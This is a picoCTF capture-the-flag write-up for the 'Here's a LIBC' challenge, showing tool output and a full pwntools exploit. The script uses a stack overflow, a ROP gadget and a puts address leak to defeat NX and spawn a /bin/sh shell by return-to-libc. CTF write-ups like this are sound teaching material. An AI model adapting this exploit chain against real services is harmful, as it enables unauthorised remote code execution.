# here's a libc
> challenge description: I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 1774

given: binary vuln, libc.so.6, Makefile

## running the binary locally

gives a segmentation fault.

fixed this with pwninit (grabs the correct linker and creates a new binary that i can actually run called vuln_patched)

```console
┌──[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/Heres_a_LIBC]
└──╼ $./vuln_patched 
WeLcOmE To mY EcHo sErVeR!
test
TeSt
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAAAAAAAAAAAAAAAAAAAAd
Segmentation fault
```

## finding the vulnerability

looks like there's a basic stack-based overflow.

but NX is enabled, so if the normal buffer-overflow exploits try to put code on the stack and execute it, it won't work.

```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/Heres_a_LIBC]
└──╼ $checksec vuln_patched
[*] '/home/user/ctfs/picoCTF/binary_exploitation/Heres_a_LIBC/vuln_patched'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```
## bypassing NX bit using return-to-libc

requirement: a basic stackbased overflow vulnerability

since ALSR is disabled, libc base address would remain constant/static 

ROPGadets in x64:
* pop rdi is used to pop stack into rdi because in 64 bit arch, argumgents are put into register instead of stack
* 4 argument is rdi -> rsi -> rdx -> rcx

#### find a pop rdi to use

```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/Heres_a_LIBC]
└──╼ $ROPgadget --binary vuln_patched | grep rdi;
0x00000000004006c9 : and bl, ch ; or cl, byte ptr [rdi] ; mov dh, 0x45 ; cld ; jmp 0x4006d6
0x00000000004006cb : or cl, byte ptr [rdi] ; mov dh, 0x45 ; cld ; jmp 0x4006d6
0x00000000004006c2 : or dword ptr [rdi], ecx ; mov dh, 0x45 ; cld ; add eax, 0x20 ; jmp 0x4006d6
0x0000000000400913 : pop rdi ; ret
0x00000000004006c8 : shl byte ptr [rax], 0xeb ; or cl, byte ptr [rdi] ; mov dh, 0x45 ; cld ; jmp 0x4006d6
```
the pop rdi address to use: `0x0000000000400913`

#### find the offset needed to overwrite rsp

```assembly
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ r
Starting program: /home/user/ctfs/picoCTF/binary_exploitation/Heres_a_LIBC_tcache/vuln_patched 
WeLcOmE To mY EcHo sErVeR!
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
AaA%AaSaAbAa$aAnAaCaA-Aa(aAdAa;aA)AaEaAaAa0aAfAaBaA1AaGaAcAa2aAhAaDaA3AaIaAeAa4aAjAaFaA5AaKaAgAa6aAlAAhAA7AAMAAiAA8AANAAd

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7a ('z')
RBX: 0x0 
RCX: 0x7ffff7af4264 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7dd18c0 --> 0x0 
RSI: 0x7ffff7dd07e3 --> 0xdd18c0000000000a 
RDI: 0x1 
RBP: 0x6c41415041416b41 ('AkAAPAAl')
RSP: 0x7fffffffde78 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
RIP: 0x400770 (<do_stuff+152>:	ret)
R8 : 0x79 ('y')
R9 : 0x0 
R10: 0x0 
R11: 0x246 
R12: 0x1b 
R13: 0x0 
R14: 0x1b 
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400769 <do_stuff+145>:	call   0x400540 <puts@plt>
   0x40076e <do_stuff+150>:	nop
   0x40076f <do_stuff+151>:	leave  
=> 0x400770 <do_stuff+152>:	ret    
   0x400771 <main>:	push   rbp
   0x400772 <main+1>:	mov    rbp,rsp
   0x400775 <main+4>:	push   r15
   0x400777 <main+6>:	push   r14
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffde78 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0x7fffffffde80 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0x7fffffffde88 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0x7fffffffde90 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0032| 0x7fffffffde98 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0040| 0x7fffffffdea0 ("AuAAXAAvAAYAAwAAZAAxAAyA")
0048| 0x7fffffffdea8 ("AAYAAwAAZAAxAAyA")
0056| 0x7fffffffdeb0 ("ZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400770 in do_stuff ()
gdb-peda$ x/xg $rsp
0x7fffffffde78:	0x41416d4141514141
gdb-peda$ pattern offset 0x41416d4141514141
4702159612987654465 found at offset: 136
```

offset needed: 136

#### find the address of the puts function in the GOT and PLT (Procedural Link Table) of the binary.

```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/Heres_a_LIBC_tcache]
└──╼ $objdump -D vuln_patched | grep puts
0000000000400540 <puts@plt>:
  400540:	ff 25 d2 0a 20 00    	jmp    *0x200ad2(%rip)        # 601018 <puts@GLIBC_2.2.5>
  400769:	e8 d2 fd ff ff       	call   400540 <puts@plt>
  400891:	e8 aa fc ff ff       	call   400540 <puts@plt>

```

### final exploit script
```python
#!/usr/bin/env python3

# https://akshit-singhal.medium.com/rop-chain-exploit-with-example-7e444939a2ec

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 1774)

    return r


def main():
    p = conn()
    context(os='linux', arch='amd64')
    put_plt_addr = p64(0x400540)                     # $ objdump -D vuln_patched | grep puts;;; (400540:	ff 25 d2 0a 20 00    	jmp    *0x200ad2(%rip))
    put_got_addr = p64(0x601018)                     # $ objdump -D vuln_patched | grep puts;;; (# 601018 <puts@GLIBC_2.2.5>)
    main_plt_addr = p64(0x400771)                    # $ objdump -D vuln_patched | grep main;;; (0000000000400771 <main>:)
    pop_rdi_gadget = p64(0x400913)                   # $ ROPgadget --binary vuln_patched | grep rdi; (0x0000000000400913 : pop rdi ; ret)
    
    # gdb > pattern create 200 > x/xg $rsp > pattern offset 0x41416d4141514141 for padding
    payload = b'A'*136
    payload += pop_rdi_gadget
    payload += put_got_addr
    payload += put_plt_addr
    payload += main_plt_addr
    p.clean()
    p.sendline(payload)
    p.recvline()
    p.recvline()

    received_line = p.recvline().strip()
    leaked = u64(received_line.ljust(8, b"\x00"))
    log.info(f"leaked address: {hex(leaked)}")

    libc.address = leaked - libc.symbols['puts']    # finding offset
    log.info(f"libc base address: {hex(libc.address)}")

    bin_sh = next(libc.search(b"/bin/sh"))
    system = libc.symbols['system']
    ret = p64(0x40052e)                             # $ ROPgadget --binary vuln_patched | grep ret;; (find only "ret" instruction & add to avoid segfault)

        # segfault will occur due to alternative stack alignments in Ubuntu 18.04. 
        # solution is to find a simple ret address within the binary, and use that to re-align the stack after using /bin/sh
    
    log.info(f"/bin/sh: {hex(bin_sh)}")
    log.info(f"system: {hex(system)}")

    payload2 = b'A'*136
    payload2 += pop_rdi_gadget
    payload2 += p64(bin_sh)
    payload2 += ret
    payload2 += p64(system)
    
    p.clean()

    # log.info("Payload 2: " + str(payload2))

    p.sendline(payload2)
    p.interactive()

if __name__ == "__main__":
    main()
```
